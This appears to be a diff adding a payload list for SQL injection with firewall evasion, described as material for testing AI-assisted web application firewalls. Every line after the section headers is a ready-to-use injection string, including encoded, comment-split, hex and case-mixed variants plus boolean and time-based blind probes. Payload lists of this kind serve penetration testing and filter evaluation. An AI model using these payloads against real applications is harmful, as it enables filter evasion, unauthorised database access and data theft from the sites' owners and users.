@@ -1,0 +1,92 @@
+# SQL Injection - Evasion Payloads (WAF Bypass)
+# Advanced encoding and obfuscation techniques for testing AI-assisted WAFs
+
+# ==== Double URL Encoding ====
+%2527%2520OR%2520%25271%2527%253D%25271
+%2527%2520UNION%2520SELECT%2520NULL--%2520
+%25271%2527%2520OR%2520%25271%2527%253D%25271
+
+# ==== Unicode Encoding ====
+1%u0027%20OR%20%u00271%u0027=%u00271
+%u0027%20UNION%20SELECT%20NULL--%20
+%u0027%20OR%20%u00271%u0027=%u00271
+
+# ==== Mixed Case (CamelCase) ====
+1' oR '1'='1
+1' UnIoN SeLeCt NULL--
+SeLeCt * FrOm users WhErE id=1
+1' Or '1'='1' aNd '1'='1
+uNiOn aLl sElEcT 1,2,3--
+
+# ==== Comment Insertion ====
+1'/**/OR/**/1=1--
+1'/**/UNION/**/SELECT/**/NULL--/**/
+1'/**/AND/**/1=1--
+SE/**/LECT * FR/**/OM users--
+UN/**/ION SE/**/LECT 1,2,3--
+1'/*!50000OR*/1=1--
+1'/*!UNION*//*!SELECT*/1,2,3--
+
+# ==== Whitespace Alternatives ====
+1'%09OR%091=1--
+1'%0AOR%0A1=1--
+1'%0COR%0C1=1--
+1'%0DOR%0D1=1--
+1'%A0OR%A01=1--
+
+# ==== NULL Byte Injection ====
+1'%00OR%001=1--
+1'%00UNION%00SELECT%00NULL--
+
+# ==== Parenthesis Obfuscation ====
+1') OR ('1'='1
+1')) OR (('1'='1
+1' OR (1=1)--
+1' OR ((1)=(1))--
+
+# ==== Synonym Functions ====
+1' OR MID(1,1,1)--
+1' OR SUBSTRING(version(),1,1)>'4'--
+1' OR SUBSTR(version(),1,1)>'4'--
+1' OR LEFT(version(),1)>'4'--
+1' OR ASCII(MID(version(),1,1))>50--
+1' OR ORD(MID(version(),1,1))>50--
+1' OR HEX(version())>'34'--
+
+# ==== Concatenation Bypass ====
+1' OR 'a'||'b'='ab'--
+1' OR 'a'+'b'='ab'--
+1' OR CONCAT('a','b')='ab'--
+1' OR 'a' 'b'='ab'--
+
+# ==== Scientific Notation ====
+1e0' OR '1e0'='1e0
+1.0e0' OR '1.0e0'='1.0e0
+
+# ==== Hex Encoding ====
+0x31' OR '0x31'='0x31
+1' OR 0x31=0x31--
+1' OR 0x61646D696E=username--
+
+# ==== String Tricks ====
+1' OR 'admin' LIKE 'adm%'--
+1' OR 'admin' REGEXP '^adm'--
+1' OR 'admin' RLIKE '^adm'--
+1' OR 1 IN (1)--
+1' OR 1 BETWEEN 0 AND 2--
+
+# ==== Version-specific bypasses ====
+1' OR @@version>'5'--
+1' OR VERSION()>'5'--
+1' OR USER() IS NOT NULL--
+
+# ==== Boolean-based blind ====
+1' AND 1=1 AND '1'='1
+1' AND 1=2 AND '1'='1
+1' AND SUBSTRING(@@version,1,1)='5' AND '1'='1
+
+# ==== Time-based blind (signatures only) ====
+1' AND SLEEP(5)--
+1' AND BENCHMARK(10000000,SHA1('test'))--
+1'; WAITFOR DELAY '0:0:5'--
+1' AND pg_sleep(5)--
